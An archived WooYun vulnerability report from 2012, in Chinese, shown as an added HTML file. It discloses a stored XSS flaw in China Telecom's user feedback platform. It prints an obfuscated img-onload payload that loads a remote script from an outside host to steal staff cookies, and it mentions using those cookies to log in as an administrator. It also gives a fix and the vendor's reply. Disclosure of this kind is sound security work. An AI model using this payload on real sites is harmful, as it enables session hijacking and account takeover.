@@ -1,0 +1,226 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国电信某平台储存型跨站  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国电信某平台储存型跨站  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/pestu">pestu</a> 
+</li><li>提交时间：		2012-03-13 14:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-03-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-03-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-03-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-04-03：	细节向普通白帽子公开<br/>
+									2012-04-13：	细节向实习白帽子公开<br/>
+									2012-04-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">   中国电信某平台对客户提交的留言没有进行严格验证，输出到客户端时也没有进行转义导致xss漏洞。通过xss可获取管理员cookie,管理平台地址，管理员的IP地址及所使用的浏览器等信息，进而以管理员身份登录管理平台。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">中国电信有一个中国电信互联网产品用户问题反馈平台，通过该平台用户可反馈中国电信各互联网产品的bug。如图：<br />
+<br />
+</p><p class="detail"><a href="../images/131349520f873d8dc9a7291a12e0548825754dd3.jpg" target="_blank"><img src="../images/131349520f873d8dc9a7291a12e0548825754dd3.jpg" alt="" width="600"/></a></p><p class="detail"> <br />
+<br />
+由于该平台对对客户提交的留言没有进行严格验证，输出到客户端时也没有进行转义导致xss漏洞。这里选取189邮箱做测试，首先登录189邮箱，点击右上角的反馈:<br />
+<br />
+</p><p class="detail"><a href="../images/131352398fbe56a77a412f1a537cd3c148afae62.jpg" target="_blank"><img src="../images/131352398fbe56a77a412f1a537cd3c148afae62.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+打开反馈页面:<br />
+<br />
+ </p><p class="detail"><a href="../images/13135450088206c97517d26ed8796cfb022800e8.jpg" target="_blank"><img src="../images/13135450088206c97517d26ed8796cfb022800e8.jpg" alt="" width="600"/></a></p><p class="detail"> <br />
+<br />
+当然这里直接输入javascript脚本是不可以的，网页中有一段javascript对输入的反馈留言做了判断，由于是客户端的判断，所以很容易绕过，这里就不多说罢。<br />
+<br />
+提交以下反馈至服务器<br />
+<br />
+</p><pre><code>&lt;img src=&#039;http://www.baidu.com/img/baidu_logo.gif&#039; onload=&#039;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,115,116,117,110,111,116,101,46,115,105,110,97,97,112,112,46,99,111,109,47,120,115,115,46,106,115,63)++ new Date().getTime(); ;document.body.appendChild(s);&#039;/&gt;</code></pre><p class='detail'><br />
+<br />
+以上代码类似于<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+<br />
+var s=document.createElement(&quot;script&quot;);<br />
+s.type=&quot;text/javascript&quot;;<br />
+s.src=&quot;http://stunote.sinaapp.com/xss.js?&quot; + new Date().getTime();<br />
+document.body.appendChild(s);<br />
+<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+这里有个小技巧,js文件名是xss.js?1331394206172这种形式，主要是为了方便调试。<br />
+<br />
+这样浏览器就会以为每次引用的js文件都是不同的，当然我们的xss.js对后面的动态数并不进行处理.这次每次读取到的都是最新的js文件，js文件修改后效果可以马上看到，非常方便.<br />
+<br />
+xss.js可以是如下内容:<br />
+<br />
+</p><pre><code>alert(document.cookie);<br />
+alert(document.domain);</code></pre><p class='detail'><br />
+<br />
+弹出cookie和当前的域名<br />
+<br />
+</p><p class="detail"><a href="../images/131406454f60df3140066a2dcd2ebebee814d550.jpg" target="_blank"><img src="../images/131406454f60df3140066a2dcd2ebebee814d550.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+域名：<br />
+<br />
+</p><p class="detail"><a href="../images/131407213ff443ea35170e290518231d183531a7.jpg" target="_blank"><img src="../images/131407213ff443ea35170e290518231d183531a7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+当然我们也可以换成获取cookie和其他信息的js脚本。<br />
+<br />
+当客服看到我们的留言时就会触发,获取到的客服cookie如下:<br />
+<br />
+</p><p class="detail"><a href="../images/13140903f22eaf0810b17687385c92ce4f4598ca.jpg" target="_blank"><img src="../images/13140903f22eaf0810b17687385c92ce4f4598ca.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+从上图可以看到客服IP为 59.36.102.177 经查询该IP所在地为中国广东省广州市<br />
+<br />
+看来客服是在广州上网的，浏览器为IE7.<br />
+<br />
+有了cookie就好办了，你懂的。<br />
+<br />
+</p><p class="detail"><a href="../images/131413126553b14d33b8cf064fb3b483da066533.jpg" target="_blank"><img src="../images/131413126553b14d33b8cf064fb3b483da066533.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/13141426b618f6aba15d24ea475d77fd89f3e221.jpg" target="_blank"><img src="../images/13141426b618f6aba15d24ea475d77fd89f3e221.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/13141409f910d2e9eeea39c873a46686135763f5.jpg" target="_blank"><img src="../images/13141409f910d2e9eeea39c873a46686135763f5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+这里只对189邮箱的反馈平台作了测试，相信其他产品的反馈也存在类拟的问题。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对客户输入在服务器端进行过滤或对客户的留言输出时进行htmlencode </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/pestu" title="pestu">pestu</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-05230" title="中国电信某平台储存型跨站">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-03-14 16:38</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认漏洞情况，将由CNCERT直接协调中国电信集团公司处置。鉴于pestu同学在上回已经提交了两个相似系统的XSS漏洞，该漏洞仅追加rank 5。<br />
+<br />
+同时该漏洞也说明相关方有漏洞处置方面力度仍有欠缺，CNCERT也将继续监督。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="5230";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
